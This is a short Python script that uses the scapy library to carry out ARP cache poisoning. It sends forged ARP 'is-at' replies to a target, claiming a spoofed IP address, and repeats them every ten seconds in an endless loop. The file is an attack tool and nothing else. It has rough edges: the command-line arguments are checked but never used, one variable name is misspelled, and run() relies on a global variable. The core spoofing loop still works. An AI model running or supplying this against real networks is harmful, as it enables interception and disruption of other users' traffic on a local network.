#!/usr/bin/python

import sys, time
from scapy.all import sendp, ARP, Ether


class NoicyArpPoison(object):
    def __init__(self):
        self.interface = "eth0"
        self.target_ip = "localhost"   # sys.argv[1]
        self.fake_ip   = "192.168.0.5" # sys.argv[2]

        self.ehernet = Ether()

    
    def run(self):
        if len(sys.argv) < 3:
            print(f"{sys.argv[0]}: {self.target_ip} {self.fake_ip}")
            sys.exit(1)
        
        arp = ARP(pdst=self.target_ip,
                  psrc=self.fake_ip,
                  op="is-at")

        packet = self.ehernet / arp

        while True:
            sendp(packet, iface=attack.interface)
            time.sleep(10)    


if __name__ == "__main__":
    attack = NoicyArpPoison()
    attack.run()